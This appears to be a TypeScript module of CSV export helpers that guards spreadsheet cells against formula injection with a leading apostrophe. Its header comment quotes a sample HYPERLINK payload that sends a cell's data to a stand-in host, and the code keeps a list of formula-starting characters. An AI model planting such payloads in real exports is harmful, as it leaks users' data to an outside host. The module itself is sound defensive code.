/**
 * CSV cell encoding, shared by the admin exports.
 *
 * Quoting alone is not enough. Wrapping a value in double quotes makes it a valid CSV
 * field, but Excel, LibreOffice and Google Sheets all decide whether a cell is a FORMULA
 * from its first character after parsing - so a provider whose display name is
 * `=HYPERLINK("http://x/?"&A1,"click")` gets that evaluated in the admin's spreadsheet,
 * with the admin's own data as the argument. Client names, provider names and service
 * titles are all user-supplied and all go straight into these files.
 *
 * The mitigation is a leading apostrophe, which spreadsheets strip on display and treat as
 * "this is text".
 */

// `=` and `+` and `@` start a formula; tab and carriage return are the sneakier variants
// that some versions treat as leading whitespace and then parse what follows.
const FORMULA_STARTERS = ['=', '+', '@', '\t', '\r'];

/**
 * Whether a cell needs the text prefix.
 *
 * `-` is handled separately from the rest: it starts a formula, but it also starts every
 * negative number, and a refund column reading `'-500` instead of `-500` would arrive in
 * the spreadsheet as text and silently drop out of any SUM the admin writes over it. So a
 * leading `-` is only escaped when what follows is not simply a number.
 */
export function needsFormulaGuard(value: string): boolean {
  if (value.length === 0) return false;
  if (FORMULA_STARTERS.includes(value[0])) return true;
  if (value[0] === '-') return !Number.isFinite(Number(value));
  return false;
}

/** One CSV field: formula-guarded, quoted, with internal quotes doubled. */
export function csvCell(value: unknown): string {
  const raw =
    value === null || value === undefined
      ? ''
      : typeof value === 'object'
        ? JSON.stringify(value)
        : String(value);
  const guarded = needsFormulaGuard(raw) ? `'${raw}` : raw;
  return `"${guarded.replace(/"/g, '""')}"`;
}

/** A whole CSV document. CRLF, because that is what spreadsheet software expects. */
export function csvDocument(header: string[], rows: unknown[][]): string {
  return [header, ...rows].map((row) => row.map(csvCell).join(',')).join('\r\n');
}

/**
 * Hands the file to the browser.
 *
 * The BOM is what makes Excel on Windows read the peso sign and accented provider names as
 * UTF-8 rather than mojibake; without it a report full of Filipino names opens visibly
 * corrupted.
 */
export function downloadCsvFile(filename: string, csv: string): void {
  const url = URL.createObjectURL(new Blob(['﻿' + csv], { type: 'text/csv;charset=utf-8;' }));
  const a = document.createElement('a');
  a.href = url;
  a.download = filename;
  a.click();
  URL.revokeObjectURL(url);
}
